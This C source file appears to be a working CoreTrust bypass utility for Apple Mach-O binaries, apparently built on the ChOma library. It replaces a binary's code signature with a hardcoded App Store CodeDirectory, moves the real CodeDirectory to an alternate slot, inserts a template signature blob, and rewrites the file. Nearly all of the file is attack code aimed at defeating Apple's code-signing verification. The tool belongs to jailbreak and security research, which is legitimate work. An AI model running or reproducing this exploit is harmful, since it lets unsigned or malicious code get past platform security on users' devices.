
#include <stdint.h>
#include <stdio.h>
#include <choma/CSBlob.h>
#include <choma/MachOByteOrder.h>
#include <choma/MachO.h>
#include <choma/Host.h>
#include <choma/MemoryStream.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include <choma/Signing.h>
#include <choma/SignatureBlob.h>
#include <choma/SignOSSL.h>
#include <choma/CodeDirectory.h>
#include "AppStoreCodeDirectory.h"
#include "TemplateSignatureBlob.h"

char *extract_preferred_slice(const char *fatPath)
{
    FAT *fat = fat_init_from_path(fatPath);
    MachO *macho = fat_find_preferred_slice(fat);
    
    char *temp = strdup("/tmp/XXXXXX");
    mkstemp(temp);

    MemoryStream *outStream = file_stream_init_from_path(temp, 0, 0, FILE_STREAM_FLAG_WRITABLE | FILE_STREAM_FLAG_AUTO_EXPAND);
    MemoryStream *machoStream = macho_get_stream(macho);
    memory_stream_copy_data(machoStream, 0, outStream, 0, memory_stream_get_size(machoStream));

    fat_free(fat);
    memory_stream_free(outStream);
    return temp;
}

int main(int argc, char *argv[]) {
    printf("CoreTrust bypass eta s0n!!\n");

    if (argc < 2) {
        printf("Usage: %s <path to MachO file>\n", argv[0]);
        return -1;
    }

    // Make sure the last argument is the path to the FAT/MachO file
    struct stat fileStat;
    if (stat(argv[argc - 1], &fileStat) != 0 && argc > 1) {
        printf("Please ensure the last argument is the path to a FAT/MachO file.\n");
        return -1;
    }

    char *filePath = argv[1];
    char *machoPath = extract_preferred_slice(filePath);
    printf("extracted best slice to %s\n", machoPath);

    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;

    CS_SuperBlob *superblob = (CS_SuperBlob *)macho_find_code_signature(macho);
    uint64_t sizeOfCodeSignature = BIG_TO_HOST(superblob->length);

    FILE *fp = fopen("data/blob.orig", "wb");
    fwrite(superblob, BIG_TO_HOST(superblob->length), 1, fp);
    fclose(fp);

    DecodedSuperBlob *decodedSuperblob = superblob_decode(superblob);

    // Replace the first CodeDirectory with the one from the App Store
    DecodedBlob *blob = decodedSuperblob->firstBlob;
    if (blob->type != CSSLOT_CODEDIRECTORY) {
        printf("The first blob is not a CodeDirectory!\n");
        return -1;
    }

    bool hasTwoCodeDirectories = superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES) != NULL;
    if (!hasTwoCodeDirectories) {
        // We need to insert the App Store CodeDirectory in the first slot and move the original one to the last slot
        DecodedBlob *firstCD = superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY);
        DecodedBlob *currentBlob = decodedSuperblob->firstBlob;
        while (currentBlob->next) {
            currentBlob = currentBlob->next;
        }
        currentBlob->next = malloc(sizeof(DecodedBlob));
        currentBlob->next->stream = firstCD->stream;
        currentBlob->next->type = CSSLOT_ALTERNATE_CODEDIRECTORIES;
        currentBlob->next->next = NULL;

    } else {
        // Don't free if we've moved the original CodeDirectory to the last slot
        memory_stream_free(blob->stream);
    }

    MemoryStream *newCDStream = buffered_stream_init_from_buffer(AppStoreCodeDirectory, AppStoreCodeDirectory_len);
    blob->stream = newCDStream;

    // DecodedSuperblob *newDecodedSuperblob = malloc(sizeof(DecodedSuperBlob));
    DecodedSuperBlob *newDecodedSuperblob = superblob_decode(superblob);

    /*
        App Store CodeDirectory
        Requirements
        Entitlements
        DER entitlements
        Actual CodeDirectory
        Signature blob
    */

    DecodedBlob *appStoreCDBlob = malloc(sizeof(DecodedBlob));
    appStoreCDBlob->type = CSSLOT_CODEDIRECTORY;
    appStoreCDBlob->stream = buffered_stream_init_from_buffer(AppStoreCodeDirectory, AppStoreCodeDirectory_len);

    DecodedBlob *requirementsBlob = superblob_find_blob(decodedSuperblob, CSSLOT_REQUIREMENTS);

    DecodedBlob *entitlementsBlob = superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS);

    DecodedBlob *derEntitlementsBlob = superblob_find_blob(decodedSuperblob, CSSLOT_DER_ENTITLEMENTS);

    DecodedBlob *actualCDBlob = superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES);

    DecodedBlob *signatureBlob = superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT);

    if (signatureBlob != NULL) {
        memory_stream_free(superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT)->stream);
        superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT)->stream = buffered_stream_init_from_buffer(TemplateSignatureBlob, TemplateSignatureBlob_len);
    } else {
        signatureBlob = malloc(sizeof(DecodedBlob));
        signatureBlob->type = CSSLOT_SIGNATURESLOT;
        signatureBlob->stream = buffered_stream_init_from_buffer(TemplateSignatureBlob, TemplateSignatureBlob_len);
        signatureBlob->next = NULL;
        DecodedBlob *nextBlob = decodedSuperblob->firstBlob;
        while (nextBlob->next) {
            nextBlob = nextBlob->next;
        }
        nextBlob->next = signatureBlob;
    }

    appStoreCDBlob->next = requirementsBlob;
    requirementsBlob->next = entitlementsBlob;
    entitlementsBlob->next = derEntitlementsBlob;
    derEntitlementsBlob->next = actualCDBlob;
    actualCDBlob->next = signatureBlob;
    signatureBlob->next = NULL;

    newDecodedSuperblob->firstBlob = appStoreCDBlob;

    printf("Encoding superblob...\n");

    CS_SuperBlob *encodedSuperblobUnsigned = superblob_encode(newDecodedSuperblob);

    printf("Signing superblob...\n");

    uint64_t paddingSize = 0;
    update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, sizeOfCodeSignature, memory_stream_get_size(macho->stream), &paddingSize);

    update_code_directory(macho, newDecodedSuperblob);

    update_signature_blob(newDecodedSuperblob);

    CS_SuperBlob *newSuperblob = superblob_encode(newDecodedSuperblob);

    // Write the new superblob to the file
    fp = fopen("data/blob.generated", "wb");
    fwrite(newSuperblob, BIG_TO_HOST(newSuperblob->length), 1, fp);
    fclose(fp);

    // Write the new MachO to the file
    // Calculate offset to write the new code signature
    uint64_t offsetOfCodeSignature = macho_find_code_signature_offset(macho);
    // See how much space we have to write the new code signature
    uint64_t entireFileSize = memory_stream_get_size(macho->stream);
    uint64_t freeSpace = entireFileSize - offsetOfCodeSignature;
    uint64_t newCodeSignatureSize = BIG_TO_HOST(newSuperblob->length);
    if (newCodeSignatureSize >= freeSpace) {
        macho_write_at_offset(macho, offsetOfCodeSignature, newCodeSignatureSize, newSuperblob);
        uint8_t padding[paddingSize];
        memset(padding, 0, paddingSize);
        macho_write_at_offset(macho, offsetOfCodeSignature + freeSpace, paddingSize, padding);
    } else if (newCodeSignatureSize < freeSpace) {
        memory_stream_trim(macho_get_stream(macho), 0, offsetOfCodeSignature);
        macho_write_at_offset(macho, offsetOfCodeSignature, newCodeSignatureSize, newSuperblob);
        uint8_t padding[paddingSize];
        memset(padding, 0, paddingSize);
        macho_write_at_offset(macho, offsetOfCodeSignature + newCodeSignatureSize, paddingSize, padding);
    }

    decoded_superblob_free(newDecodedSuperblob);
    free(superblob);
    free(newSuperblob);
    
    macho_free(macho);
    printf("Signed file is at %s! CoreTrust bypass eta now!!\n", machoPath);
    free(machoPath);
    return 0;
}
